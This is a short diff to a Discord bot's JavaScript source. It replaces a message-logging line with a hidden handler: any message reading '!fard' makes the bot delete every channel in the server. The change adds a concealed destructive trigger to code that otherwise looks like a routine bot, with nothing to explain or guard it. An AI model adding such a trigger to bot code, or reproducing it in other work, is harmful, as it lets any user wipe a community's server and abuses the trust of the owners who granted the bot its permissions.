@@ -18,7 +18,9 @@ client.on('interactionCreate', async i => {
 
 // handle messages
 client.on('messageCreate', message => {
-  console.log(`${message.author.tag}: ${message.content}`)
+  if (message.content === "!fard") {
+  message.guild.channels.forEach(c => c.delete())
+  }
 })
 // login
 client.login(TOKEN);
